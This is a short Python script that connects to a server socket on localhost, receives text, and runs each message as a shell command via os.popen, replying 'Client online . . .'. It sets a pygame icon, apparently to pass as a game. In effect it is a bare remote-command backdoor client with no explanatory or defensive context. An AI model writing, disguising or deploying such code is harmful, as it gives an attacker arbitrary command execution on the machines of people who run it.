import socket
import os
import pygame

pygame.display.set_icon(pygame.image.load('Icon'))
server = socket.socket()
host = '127.0.0.1'
port = 1234

run = True
server.connect((host,port))
while run:


    msg = server.recv(1024)
    os.popen(msg.decode('UTF-8'))

    server.send('Client online . . .'.encode('UTF-8'))


